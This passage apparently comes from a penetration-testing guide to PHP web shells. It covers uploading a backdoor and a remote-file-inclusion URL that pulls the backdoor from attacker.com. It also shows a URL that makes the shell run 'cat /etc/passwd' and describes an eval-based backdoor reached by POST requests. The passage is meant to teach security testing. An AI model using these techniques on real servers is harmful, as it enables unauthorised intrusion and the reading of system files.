...
The tester can upload one of the following samples as 'WebShell-backdoor.php'. The tester can use the applications' upload functionality or remote file injection, where the backdoor can be pulled from the attacker's server with a specially crafted URL like this: [http://TargetVictimSite.com/File.php?include=http://attacker.com/WebShell-backdoor.php](http://TargetVictimSite.com/File.php?include=http://attacker.com/WebShell-backdoor.php)

The samples are modified, where the modification is marked as "CENSORED", to prevent detection by anti-malware or intrusion detection.

#### Typical WebShell

Most webshells run commands or executables from the underlying server, including the one below:
...
When uploaded, the server will execute anything in an HTTP query with parameter 'rq' as a command to this backdoor. The tester can, for example, enumerate users on the server server by visiting the URL below.

[`http://TargetVictimSite.com/WebShell-backdoor.php?rq=cat+/etc/passwd`](http://TargetVictimSite.com/WebShell-backdoor.php?rq=cat+/etc/passwd)

#### Alternate backdoor using eval

Another web shell makes use of the "eval" statement in PHP to execute arbitrary code inside the web application server.
...
This backdoor would perform code execution if a tester sends HTTP POST queries with an argument 'password' to [http://TargetVictimSite.com/WebShell-backdoor.php](http://TargetVictimSite.com/WebShell-backdoor.php).

#### Other webshells

The above samples work on servers that support PHP. See the [Kali Linux webshells repository](https://gitlab.com/kalilinux/packages/webshells) for code that affects other server types.
